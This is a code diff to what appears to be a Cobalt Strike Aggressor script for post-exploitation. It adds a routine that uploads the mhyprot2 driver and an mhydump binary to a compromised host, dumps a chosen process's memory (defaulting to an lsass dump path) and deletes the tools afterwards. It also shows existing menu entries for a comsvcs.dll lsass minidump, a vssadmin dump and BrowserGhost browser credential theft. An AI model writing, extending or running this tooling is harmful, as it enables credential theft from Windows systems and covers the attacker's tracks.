@@ -115,12 +115,39 @@ sub comsvcsdll_minidump{
 		}
 	}
 }
+sub mhydump{
+	
+	#bupload_raw($bid,"c:\\windows\\temp\\mhyprot2.Sys",script_resource("bin/mhyprot2.Sys"));
+	foreach $id ($bid){
+		bupload($id,script_resource("bin/mhyprot2.Sys"));
+		if(-is64 $id)
+	    {
+	    	blog($id,"x64");
+	        bupload($id,script_resource("bin/mhydump.x64.exe"));
+	        bshell($id,"mhydump.x64.exe $3['pid'] $3['path']");
+	        brm($id,"mhydump.x64.exe");
+
+	    } else {
+	    	blog($id,"暂时不支持 x86");
+	        
+	    }
+   		brm($id,"mhyprot2.Sys");
+	}
+}
 
 sub comsvcsdll_minidump_config{
 	$dialog = dialog("comsvcsdll_dump", %(path => "C:\\Windows\\Temp\\lsass.dmp", processname => "lsass.exe"), &comsvcsdll_minidump);
 	dialog_description($dialog, "设置保存dump的路径");
 	drow_text($dialog, "processname", "processname:");
 	drow_text($dialog, "path", "savepath:");
+	dbutton_action($dialog, "RUN");
+	dialog_show($dialog);
+}
+sub mhydump_config{
+	$dialog = dialog("Mhydump", %(pid => "639",path => "c:\\windows\\temp\\lsas.dmp"), &mhydump);
+	dialog_description($dialog, "要dump的进程pid");
+	drow_text($dialog, "pid", "pid:");
+	drow_text($dialog, "path", "save:");
 	dbutton_action($dialog, "RUN");
 	dialog_show($dialog);
 }
@@ -163,6 +190,9 @@ menu "&Dump操作"{
 	item "&vssadmin dump"{
 		vssadmindump($bid);
 	}
+	item "驱动dump进程" {
+        mhydump_config($bid);
+    }
 	item "BrowserGhost" {
         foreach $id ($1) {
             bexecute_assembly($id, script_resource("bin/BrowserGhost.exe"), $null);
